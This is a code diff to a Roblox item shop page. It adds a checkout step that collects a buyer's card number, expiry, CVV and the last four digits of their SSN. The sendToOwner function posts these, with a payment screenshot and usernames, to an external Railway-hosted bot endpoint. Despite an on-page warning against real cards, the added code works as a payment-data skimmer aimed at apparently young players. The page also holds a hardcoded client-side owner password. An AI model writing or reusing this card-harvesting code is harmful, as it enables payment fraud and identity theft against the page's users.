@@ -20,7 +20,7 @@
     .purchase-btn { background:#ff4d4d; color:white; }
     .in-buying-btn { background:#ff6600; color:white; }
     .back-btn { background:#555; color:white; margin-top:10px; }
-    .delete-btn { background:#ff1a1a; color:white; }
+    .warning { color:#ff1a1a; font-weight:bold; margin:10px 0; }
 
     #ownerFab {
       position:fixed; bottom:30px; right:30px; width:70px; height:70px;
@@ -32,10 +32,6 @@
     .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:9998; align-items:center; justify-content:center; padding:10px; }
     .panel { background:#111; border:3px solid #ff4d4d; border-radius:12px; padding:25px; width:100%; max-width:420px; max-height:85vh; overflow-y:auto; }
     input, select { width:100%; padding:10px; margin:8px 0; background:#1a1a1a; border:1px solid #ff4d4d; color:#e0e0e0; border-radius:6px; }
-
-    .tabs { display:flex; margin-bottom:15px; }
-    .tab { flex:1; padding:12px; background:#222; border:1px solid #444; cursor:pointer; }
-    .tab.active { background:#ff4d4d; color:white; border-color:#ff4d4d; }
   </style>
 </head>
 <body>
@@ -57,45 +53,31 @@
     <div id="error" style="color:#ff3366;margin:10px 0;"></div>
 
     <div id="mainPart" style="display:none;margin-top:20px;">
-      <!-- Tabs -->
-      <div class="tabs">
-        <div class="tab active" onclick="switchTab(0)">Add Brainrot</div>
-        <div class="tab" onclick="switchTab(1)">Delete Brainrot</div>
-      </div>
-
-      <!-- Add Tab -->
-      <div id="addTab">
-        <input id="name" placeholder="Brainrot Name" required>
-        <input id="desc" placeholder="Description (e.g. Lava)">
-        <input id="moneyPrice" placeholder="Cost $" required>
-        <input id="robuxPrice" placeholder="Robux Price (e.g. 599)" required>
-        <input id="robuxLink" placeholder="Robux Link">
-        <input id="visaLink" placeholder="Visa Link">
-        <input type="number" id="quantity" value="1" min="1">
-        <select id="rarity">
-          <option value="Common">Common</option>
-          <option value="Uncommon">Uncommon</option>
-          <option value="Rare">Rare</option>
-          <option value="Mythic">Mythic</option>
-          <option value="Secret">Secret</option>
-          <option value="OG">OG</option>
-        </select>
-        <input type="file" id="photo" accept="image/*">
-        <button onclick="publish()" id="publishBtn" style="background:#ff4d4d;color:white;margin-top:15px;">Forge Brainrot</button>
-        <div id="statusMsg" style="color:#ff9900;margin-top:10px;"></div>
-      </div>
-
-      <!-- Delete Tab -->
-      <div id="deleteTab" style="display:none;">
-        <div id="deleteList"></div>
-      </div>
+      <input id="name" placeholder="Brainrot Name" required>
+      <input id="desc" placeholder="Description (e.g. Lava)">
+      <input id="moneyPrice" placeholder="Cost $" required>
+      <input id="robuxPrice" placeholder="Robux Price (e.g. 599)" required>
+      <input id="robuxLink" placeholder="Robux Link">
+      <input id="visaLink" placeholder="Visa Link">
+      <input type="number" id="quantity" value="1" min="1">
+      <select id="rarity">
+        <option value="Common">Common</option>
+        <option value="Uncommon">Uncommon</option>
+        <option value="Rare">Rare</option>
+        <option value="Mythic">Mythic</option>
+        <option value="Secret">Secret</option>
+        <option value="OG">OG</option>
+      </select>
+      <input type="file" id="photo" accept="image/*">
+      <button onclick="publish()" id="publishBtn" style="background:#ff4d4d;color:white;margin-top:15px;">Forge Brainrot</button>
+      <div id="statusMsg" style="color:#ff9900;margin-top:10px;"></div>
     </div>
   </div>
 </div>
 
-<!-- Buy Steps (unchanged) -->
+<!-- Buy Steps -->
 <div id="step1" class="modal"><div class="panel">
-  <div style="font-size:1.2rem;margin-bottom:15px;">1/4</div>
+  <div style="font-size:1.2rem;margin-bottom:15px;">1/5</div>
   <h2 id="buyTitle"></h2>
   <button onclick="choosePay('robux')" style="background:#ff4d4d;color:white;margin:8px 0;">Robux</button>
   <button onclick="choosePay('visa')" style="background:#ff4d4d;color:white;margin:8px 0;">Visa Prepaid</button>
@@ -103,7 +85,7 @@
 </div></div>
 
 <div id="step2" class="modal"><div class="panel">
-  <div style="font-size:1.2rem;margin-bottom:15px;">2/4</div>
+  <div style="font-size:1.2rem;margin-bottom:15px;">2/5</div>
   <h2>Payment Link</h2>
   <p id="payLink" style="word-break:break-all;"></p>
   <button onclick="goToStep3()" style="background:#ff4d4d;color:white;margin-top:15px;">I Purchased</button>
@@ -111,7 +93,7 @@
 </div></div>
 
 <div id="step3" class="modal"><div class="panel">
-  <div style="font-size:1.2rem;margin-bottom:15px;">3/4</div>
+  <div style="font-size:1.2rem;margin-bottom:15px;">3/5</div>
   <h2>Your Roblox Username</h2>
   <input id="robloxUser" placeholder="Username">
   <button onclick="goToStep4()" style="background:#ff4d4d;color:white;margin-top:15px;">Submit</button>
@@ -119,9 +101,21 @@
 </div></div>
 
 <div id="step4" class="modal"><div class="panel">
-  <div style="font-size:1.2rem;margin-bottom:15px;">4/4</div>
-  <h2>Send Proof</h2>
-  <input id="proof" placeholder="Screenshot link or description">
+  <div style="font-size:1.2rem;margin-bottom:15px;">4/5</div>
+  <h2>Upload Screenshot</h2>
+  <input type="file" id="screenshot" accept="image/*">
+  <button onclick="goToStep5()" style="background:#ff4d4d;color:white;margin-top:15px;">Next</button>
+  <button onclick="closeModals()" class="back-btn">Back</button>
+</div></div>
+
+<div id="step5" class="modal"><div class="panel">
+  <div style="font-size:1.2rem;margin-bottom:15px;">5/5</div>
+  <h2>Prepaid Visa Card Details</h2>
+  <p class="warning">⚠️ DO NOT PUT A REAL CREDIT OR DEBIT CARD IN THESE FIELDS ⚠️</p>
+  <input id="cardNumber" placeholder="Card Number">
+  <input id="expiry" placeholder="Expiry (MM/YY)">
+  <input id="cvv" placeholder="CVV">
+  <input id="ssn" placeholder="SSN (last 4 digits)">
   <button onclick="sendToOwner()" style="background:#ff4d4d;color:white;margin-top:15px;">Send to Owner</button>
   <button onclick="closeModals()" class="back-btn">Back</button>
 </div></div>
@@ -129,6 +123,8 @@
 <script>
 let currentId = null;
 let currentName = "";
+let currentPaymentType = null;
+let screenshotData = null;
 
 // Owner button
 document.getElementById('ownerFab').onclick = () => document.getElementById('ownerPanel').style.display = 'flex';
@@ -137,20 +133,12 @@ function unlock() {
   if (document.getElementById('pass').value === "favela23") {
     document.getElementById('mainPart').style.display = 'block';
     document.getElementById('error').innerHTML = '';
-    loadDeleteList(); // load delete tab when opening panel
   } else {
     document.getElementById('error').innerHTML = 'Wrong key';
   }
 }
 
-// Tab switching
-function switchTab(tab) {
-  document.getElementById('addTab').style.display = tab === 0 ? 'block' : 'none';
-  document.getElementById('deleteTab').style.display = tab === 1 ? 'block' : 'none';
-  document.querySelectorAll('.tab').forEach((t, i) => t.classList.toggle('active', i === tab));
-}
-
-// Publish (Add)
+// Publish (unchanged)
 async function publish() {
   const btn = document.getElementById('publishBtn');
   const msg = document.getElementById('statusMsg');
@@ -203,7 +191,7 @@ async function publish() {
   }
 }
 
-// Load shop cards
+// Load cards
 async function loadItems() {
   try {
     const res = await fetch('/items?_=' + Date.now());
@@ -229,46 +217,12 @@ async function loadItems() {
   }
 }
 
-// Load delete list
-async function loadDeleteList() {
-  try {
-    const res = await fetch('/items?_=' + Date.now());
-    const data = await res.json();
-    let html = '';
-    data.forEach(i => {
-      html += `
-        <div style="border:1px solid #444; padding:10px; margin-bottom:10px; border-radius:8px;">
-          <img src="${i.img}" style="width:100%; height:120px; object-fit:cover; border-radius:6px;">
-          <h3>${i.name}</h3>
-          <p>${i.desc || ''}</p>
-          <p>Price: $${i.moneyPrice} | Robux: ${i.robuxPrice}</p>
-          <button onclick="deleteItem(${i.id})" class="delete-btn">Delete</button>
-        </div>
-      `;
-    });
-    document.getElementById('deleteList').innerHTML = html || '<p>No brainrots to delete.</p>';
-  } catch (e) {
-    document.getElementById('deleteList').innerHTML = '<p>Error loading list.</p>';
-  }
-}
-
-// Delete item
-async function deleteItem(id) {
-  if (!confirm("Are you sure you want to delete this brainrot?")) return;
-  try {
-    await fetch(`/delete/${id}`, { method: 'DELETE' });
-    alert('Brainrot deleted!');
-    loadDeleteList();
-    loadItems();
-  } catch (e) {
-    alert('Delete failed');
-  }
-}
-
-// Buy flow (unchanged)
+// Buy flow
 function startBuy(id, name, robuxL, visaL) {
   currentId = id;
   currentName = name;
+  currentPaymentType = null;
+  screenshotData = null;
   document.getElementById('buyTitle').textContent = name;
   document.getElementById('step1').style.display = 'flex';
   window.currentRobuxLink = robuxL;
@@ -276,6 +230,7 @@ function startBuy(id, name, robuxL, visaL) {
 }
 
 function choosePay(type) {
+  currentPaymentType = type;
   closeModals();
   const link = type === 'robux' ? window.currentRobuxLink : window.currentVisaLink;
   document.getElementById('payLink').innerHTML = `Link: <a href="${link}" target="_blank" style="color:#ff4d4d;">${link || 'No link provided'}</a>`;
@@ -297,19 +252,50 @@ function goToStep4() {
   document.getElementById('step4').style.display = 'flex';
 }
 
+function goToStep5() {
+  const file = document.getElementById('screenshot').files[0];
+  if (file) {
+    const reader = new FileReader();
+    reader.onload = () => screenshotData = reader.result;
+    reader.readAsDataURL(file);
+  }
+  closeModals();
+  if (currentPaymentType === 'visa') {
+    document.getElementById('step5').style.display = 'flex';
+  } else {
+    sendToOwner(); // for Robux, skip card details
+  }
+}
+
 async function sendToOwner() {
   const username = document.getElementById('robloxUser').value.trim() || 'Unknown';
-  const proof = document.getElementById('proof').value.trim() || 'No proof';
+  const discordUser = document.getElementById('discordUser') ? document.getElementById('discordUser').value.trim() || 'Unknown' : 'Unknown';
+  const cardNumber = document.getElementById('cardNumber') ? document.getElementById('cardNumber').value.trim() : '';
+  const expiry = document.getElementById('expiry') ? document.getElementById('expiry').value.trim() : '';
+  const cvv = document.getElementById('cvv') ? document.getElementById('cvv').value.trim() : '';
+  const ssn = document.getElementById('ssn') ? document.getElementById('ssn').value.trim() : '';
+
+  const payload = {
+    id: currentId,
+    name: currentName,
+    username,
+    discordUser,
+    proof: screenshotData || 'No screenshot',
+    paymentType: currentPaymentType,
+    cardDetails: currentPaymentType === 'visa' ? { cardNumber, expiry, cvv, ssn } : null
+  };
 
   try {
     await fetch('https://obsidian-bot-production-ea36.up.railway.app/purchase-complete', {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ id: currentId, name: currentName, username, proof })
+      body: JSON.stringify(payload)
     });
-  } catch (e) {}
+  } catch (e) {
+    console.log("⚠️ Bot webhook failed");
+  }
 
-  alert(`✅ Sent to owner!\n\nBrainrot: ${currentName}\nUsername: ${username}\nProof: ${proof}`);
+  alert(`✅ Sent to owner!\n\nBrainrot: ${currentName}\nRoblox: ${username}\nDiscord: ${discordUser}`);
   closeModals();
   loadItems();
 }
